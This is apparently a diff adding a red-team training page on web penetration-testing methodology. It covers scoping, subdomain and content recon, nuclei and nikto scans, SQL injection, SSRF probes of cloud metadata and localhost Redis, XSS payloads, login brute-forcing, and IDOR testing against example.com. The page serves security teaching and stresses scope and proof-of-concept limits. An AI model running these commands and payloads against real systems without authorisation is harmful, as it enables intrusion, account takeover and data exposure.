@@ -1,0 +1,215 @@
+---
+layout: training-page
+title: "Web Hacking Methodology — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - methodology
+  - web-pentest
+  - recon
+  - enumeration
+  - workflow
+page_key: "web-hacking-methodology"
+---
+<h1>Web Hacking Methodology</h1>
+<p>A structured workflow for web application penetration testing — from initial scope definition and reconnaissance through vulnerability discovery, exploitation, and reporting. This methodology applies to bug bounties, internal assessments, and CTF web challenges.</p>
+
+<h2>Phase 1 — Scope and Target Mapping</h2>
+<p>Define what is in scope before touching anything. For bug bounties, read the program policy carefully. For engagements, confirm the scope document.</p>
+<pre><code># Define scope
+TARGET=example.com
+SCOPE="*.example.com"
+
+# Create a working directory
+mkdir -p ~/assessments/$TARGET/{recon,vulns,screenshots,burp,notes}</code></pre>
+
+<h3>Technology Fingerprinting</h3>
+<pre><code># Identify tech stack with whatweb
+whatweb -a 3 https://example.com
+
+# Or with Wappalyzer CLI
+wappalyzer https://example.com
+
+# Check response headers manually
+curl -sI https://example.com | grep -i -E "server|x-powered|x-generator|set-cookie"</code></pre>
+
+<h2>Phase 2 — Reconnaissance</h2>
+<h3>Subdomain Enumeration</h3>
+<pre><code># Passive: certificate transparency
+subfinder -d example.com -o subdomains.txt
+amass enum -passive -d example.com -o subdomains-amass.txt
+
+# Active DNS brute-force
+ffuf -u https://FUZZ.example.com -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -mc 200,301,302,403 -o subdomains-ffuf.json
+
+# Merge and resolve
+cat subdomains.txt subdomains-amass.txt | sort -u | dnsx -silent -o resolved.txt</code></pre>
+
+<h3>Web Asset Discovery</h3>
+<pre><code># HTTP probe all resolved subdomains
+cat resolved.txt | httpx -silent -o live-hosts.txt
+
+# Take screenshots of all live hosts
+gowitness file -f live-hosts.txt -P screenshots/
+
+# Enumerate content on each target
+ffuf -u https://example.com/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt \
+  -mc 200,201,301,302,403 -o content-discovery.json</code></pre>
+
+<h3>JavaScript and API Endpoint Extraction</h3>
+<pre><code># Extract endpoints from JS files
+echo "https://example.com" | gau | grep "\.js$" | sort -u | xargs -I {} \
+  curl -s {} | grep -oP "(?<=['\"])/[a-zA-Z0-9/_-]+" | sort -u
+
+# Use hakrawler to crawl and extract links
+echo "https://example.com" | hakrawler -depth 3 -plain
+
+# Extract all URLs from Wayback Machine
+echo "example.com" | waybackurls | tee wayback.txt</code></pre>
+
+<h2>Phase 3 — Attack Surface Analysis</h2>
+<p>Classify every entry point before starting to exploit. Entry points include:</p>
+<ul>
+  <li>Query parameters and path segments in URLs</li>
+  <li>POST body parameters (form data, JSON, XML)</li>
+  <li>HTTP headers (Host, Referer, User-Agent, X-Forwarded-For, Origin, custom headers)</li>
+  <li>Cookies and JWT tokens</li>
+  <li>File upload fields</li>
+  <li>WebSocket messages</li>
+  <li>GraphQL queries and mutations</li>
+</ul>
+<pre><code># Identify all parameters in captured traffic with paramspider
+paramspider -d example.com -o params.txt
+
+# Or extract from wayback URLs
+cat wayback.txt | grep "?" | cut -d "?" -f 2 | tr "&" "\n" | \
+  cut -d "=" -f 1 | sort -u &gt; unique-params.txt</code></pre>
+
+<h2>Phase 4 — Vulnerability Testing</h2>
+<h3>Automated Scanning</h3>
+<pre><code># Nuclei — template-based scanning
+nuclei -l live-hosts.txt -t ~/nuclei-templates/ -o nuclei-results.txt -severity medium,high,critical
+
+# Nuclei — focused web vulnerability scan
+nuclei -u https://example.com -t http/vulnerabilities/ -t http/exposures/ \
+  -t http/default-logins/ -o nuclei-web.txt
+
+# nikto — classic web server scan
+nikto -h https://example.com -o nikto-output.txt</code></pre>
+
+<h3>Manual Testing Priority Order</h3>
+<p>Prioritize by likelihood of impact. Test in this order:</p>
+<ol>
+  <li><strong>Authentication and authorization</strong> — login bypass, IDOR, forced browsing, privilege escalation</li>
+  <li><strong>Injection</strong> — SQLi, SSTI, SSI, command injection in all input fields</li>
+  <li><strong>SSRF</strong> — test URL parameters, Webhooks, import functions, and XML parsers</li>
+  <li><strong>XSS</strong> — reflected, stored, DOM-based in all user-input reflection points</li>
+  <li><strong>File upload</strong> — MIME bypass, filename traversal, content-type bypass</li>
+  <li><strong>Business logic</strong> — price manipulation, race conditions, workflow bypass</li>
+  <li><strong>Information disclosure</strong> — error messages, debug endpoints, stack traces</li>
+  <li><strong>Third-party integrations</strong> — OAuth flows, API keys, webhook validation</li>
+</ol>
+
+<h3>SQL Injection — Quick Test</h3>
+<pre><code># Manual probe
+curl "https://example.com/items?id=1'"
+curl "https://example.com/items?id=1 AND SLEEP(5)--"
+
+# Automated with sqlmap
+sqlmap -u "https://example.com/items?id=1" --batch --level 3 --risk 2 \
+  --dbs -o --output-dir=./sqlmap-output</code></pre>
+
+<h3>SSRF — Quick Test</h3>
+<pre><code># Probe internal metadata and localhost
+curl "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "https://example.com/fetch?url=http://127.0.0.1:6379/info"
+
+# Out-of-band detection with Burp Collaborator / interactsh
+curl "https://example.com/fetch?url=https://YOUR_INTERACTSH_ID.oast.me"</code></pre>
+
+<h3>XSS — Quick Test</h3>
+<pre><code># Reflected XSS probe
+curl "https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"
+curl "https://example.com/search?q=&lt;img src=x onerror=alert(1)&gt;"
+
+# DOM XSS — test in browser console
+document.getElementById("output").innerHTML = location.hash.slice(1)
+# Then visit: https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+
+<h3>Parameter Fuzzing</h3>
+<pre><code># Fuzz all discovered parameters with ffuf
+ffuf -u "https://example.com/search?FUZZ=test" \
+  -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mc 200 -fs 1234
+
+# Fuzz parameter values for injection
+ffuf -u "https://example.com/search?q=FUZZ" \
+  -w /opt/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -mc 200</code></pre>
+
+<h2>Phase 5 — Authentication Testing</h2>
+<pre><code># Test for default credentials
+nuclei -u https://example.com -t http/default-logins/
+
+# Brute-force login with ffuf
+ffuf -u https://example.com/login -X POST \
+  -d "username=admin&password=FUZZ" \
+  -w /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -mc 302 -fs 1234
+
+# Test for account enumeration via timing or response differences
+for user in admin administrator root test user; do
+  curl -s -o /dev/null -w "%{http_code} %{time_total} $user\n" \
+    -X POST -d "username=$user&password=wrongpassword" https://example.com/login
+done</code></pre>
+
+<h2>Phase 6 — API Testing</h2>
+<pre><code># Enumerate API endpoints
+ffuf -u https://api.example.com/v1/FUZZ \
+  -w /opt/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -mc 200,201,400,401,403,405
+
+# Test all HTTP methods on discovered endpoints
+for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
+  echo -n "$method: "
+  curl -s -o /dev/null -w "%{http_code}" -X $method https://api.example.com/v1/users
+  echo
+done
+
+# Test IDOR by swapping IDs
+curl -H "Authorization: Bearer TOKEN_A" https://api.example.com/v1/users/1002/profile
+curl -H "Authorization: Bearer TOKEN_A" https://api.example.com/v1/users/1001/profile</code></pre>
+
+<h2>Phase 7 — Post-Exploitation and Impact Demonstration</h2>
+<p>Demonstrate impact clearly without causing damage. For each vulnerability:</p>
+<ul>
+  <li>Capture a screenshot of the exploitation in action</li>
+  <li>Document the exact request/response in Burp Suite</li>
+  <li>Articulate the business impact (data accessed, accounts compromised, etc.)</li>
+  <li>Stop at proof of concept — do not extract real PII or user data</li>
+</ul>
+<pre><code># Export Burp Suite request as curl command for documentation
+# In Burp: right-click request &gt; Copy as curl command
+
+# Take a screenshot with the vulnerability visible
+chromium --headless --screenshot --window-size=1280,800 \
+  "https://example.com/vuln?param=payload" screenshot.png</code></pre>
+
+<h2>Useful Burp Suite Extensions</h2>
+<ul>
+  <li><strong>ActiveScan++</strong> — Extended active scanning checks</li>
+  <li><strong>Autorize</strong> — Automated IDOR and privilege escalation testing</li>
+  <li><strong>JWT Editor</strong> — Analyze and attack JWT tokens</li>
+  <li><strong>Turbo Intruder</strong> — High-speed fuzzing and race condition testing</li>
+  <li><strong>Param Miner</strong> — Discover unlinked and hidden parameters</li>
+  <li><strong>CSPT Burp Extension</strong> — Client-side path traversal discovery</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>OWASP Web Security Testing Guide — <code>owasp.org/www-project-web-security-testing-guide/</code></li>
+  <li>PayloadsAllTheThings — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+  <li>HackTricks Web Hacking — <code>book.hacktricks.xyz/pentesting-web</code></li>
+  <li>PortSwigger Web Security Academy — <code>portswigger.net/web-security</code></li>
+  <li>Bug Bounty Hunting Methodology v4 — Jason Haddix — <code>github.com/jhaddix/tbhm</code></li>
+</ul>
